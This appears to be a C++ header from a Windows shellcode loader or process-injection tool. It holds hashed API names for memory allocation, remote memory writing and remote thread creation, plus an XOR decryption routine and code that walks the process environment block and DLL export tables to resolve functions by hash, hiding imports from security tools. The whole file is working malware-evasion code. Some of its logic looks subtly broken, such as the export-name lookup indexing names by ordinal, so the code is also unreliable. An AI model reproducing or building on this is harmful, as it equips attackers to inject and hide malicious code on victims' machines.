#pragma once
#include <windows.h>
#include <winternl.h>
size_t KERNELHASH = 16602396236623191500;
size_t VIRTUALPROTECTHASH = 7157003931739585196;
size_t CREATETHREADHASH = 4011463126652645628;
size_t VIRTUALALLOCHASH = 205147645817062751;
size_t CREATEPROCESSAHASH = 12561052703071791617;
size_t OPENPROCESSHASH = 2843696066528571155;
size_t VIRTUALALLOCEXHASH = 7157004505867124520;
size_t WRITEPROCESSMEMORYHASH = 14098267764990435783;
size_t VIRTUALPROTECTEXHASH = 5414628838643307432;
size_t CREATEREMOTETHREADHASH = 15738232585139351804;
size_t RESUMETHREADHASH = 14324824843294769404;
const int PRIME_CONST = 31;

// Dynamic Invoke nonsense
typedef HANDLE(*CREATETHREAD)(LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
    );

typedef LPVOID(*VIRTUALALLOC)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

typedef BOOL(*VIRTUALPROTECT)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
    );

typedef BOOL(*CREATEPROCESSA)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef HANDLE(*OPENPROCESS)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);

typedef LPVOID(*VIRTUALALLOCEX)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

typedef BOOL(*WRITEPROCESSMEMORY)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
);

typedef BOOL(*VIRTUALPROTECTEX)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
);

typedef HANDLE(*CREATEREMOTETHREAD)(
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);

typedef DWORD(*RESUMETHREAD)(
    HANDLE hThread
);

size_t hashUnicode(UNICODE_STRING key) {
    size_t hashCode = 0;
    //std::size_t h1 = std::hash<PWSTR>{}(key.Buffer);
    for (int i = 0; i < key.Length / 2; i++) {
        //printf("%c\n", key.Buffer[i]);
        hashCode += (key.Buffer[i] ^ hashCode) * PRIME_CONST;
        //printf("%lli\n", hashCode);
    }
    return hashCode;
}

size_t hashFunction(LPCSTR key) {
    size_t hashCode = 0;
    int length = strlen(key);
    //std::size_t h1 = std::hash<PWSTR>{}(key.Buffer);
    for (int i = 0; i < length; i++) {
        //printf("%c\n", key[i]);
        hashCode += (key[i] ^ hashCode) * PRIME_CONST;
        //printf("%lli\n", hashCode);
    }
    return hashCode;
}

void xor_data(unsigned char data[], int dataLen, char key[], int keyLen)
{
    for (int i = 0; i < dataLen; i++)
    {
        //printf("%c\n", data[i] ^ key[i % keyLen]);
        data[i] = data[i] ^ key[i % (keyLen - 1)];
    }
}


PPEB getPeb() {
    PPEB peb;
    // Thread Environment Block (TEB)
#if defined(_M_X64) // x64
    PTEB tebPtr = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
#else // x86
    PTEB tebPtr = reinterpret_cast<PTEB>(__readfsdword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
#endif

    peb = tebPtr->ProcessEnvironmentBlock;
    return peb;
}

HMODULE getLibByHash(PPEB peb, size_t hash) {
    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head;
    LIST_ENTRY* curEntry = NULL;
    HMODULE modBase = NULL;

    //linkedList = ldr->InMemoryOrderModuleList;
    head = &(ldr->InMemoryOrderModuleList);
    curEntry = head->Flink;

    while (true)
    {
        //printf("----------------------------------------------\n");
        // find the head of the object
        //printf("GETTING THE LDR_DATA\n");
        LDR_DATA_TABLE_ENTRY* module = (LDR_DATA_TABLE_ENTRY*)CONTAINING_RECORD(curEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        //printf("Got LDR_DATA\n");

        if (module == NULL)
        {
            return NULL;
        }

        if (hash == hashUnicode(module->FullDllName))
        {
            // Get base address as handle
            modBase = (HMODULE)module->DllBase;
        }
        // advance to the next object
        curEntry = curEntry->Flink;

        if (curEntry == head)
        {
            break;
        }
    }

    if (modBase)
    {
        return modBase;
    }

    else
    {
        return NULL;
    }
}


UINT_PTR getFuncByHash(HMODULE handle, size_t hash)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)handle;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dos + (dos)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PWORD ordinals = (PWORD)((UINT_PTR)handle + exports->AddressOfNameOrdinals);
    PDWORD names = (PDWORD)((UINT_PTR)handle + exports->AddressOfNames);
    PDWORD functions = (PDWORD)((UINT_PTR)handle + exports->AddressOfFunctions);
    for (DWORD i = 0; i < exports->NumberOfNames; i++)
    {
        LPCSTR name = (LPCSTR)((UINT_PTR)handle + names[ordinals[i]]);
        //LPCSTR name = (LPCSTR)((ULONG_PTR)kernBase + functions[ordinals[i]]);
        if (hashFunction(name) == hash)
        {
            return ((UINT_PTR)handle + functions[ordinals[i]]);
        }
    }

    return NULL;
}